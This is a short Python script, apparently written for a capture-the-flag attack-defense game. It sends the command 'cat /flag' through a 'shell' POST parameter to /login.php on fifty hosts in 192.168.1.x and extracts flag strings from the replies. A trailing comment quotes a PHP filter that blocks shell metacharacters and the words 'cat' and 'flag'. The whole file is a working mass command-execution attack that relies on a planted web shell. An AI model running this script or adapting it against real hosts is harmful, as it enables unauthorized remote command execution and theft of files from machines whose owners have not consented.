import re
import requests

ips = [f"192.168.1.{i}" for i in range(1, 51)]
data = {"shell": "cat /flag"}
for ip in ips:
    url = 'http://' + ip + '/login.php'
    print(url)
    r = requests.post(url, data=data)  # post执行
    if r.status_code == 200:
        x = r.text
        flag = re.search('flag\{[a-zA-Z0-9_-]+\}', x)  #r'flag{\w+?}'
        print(url," have flag ", flag.group())
    else:
        print(url," no flag ,status_code :" , r.status_code)



'''
if (!preg_match_all("/(\||&|;| |\/|cat|flag|ctfhub)/", $ip, $m
'''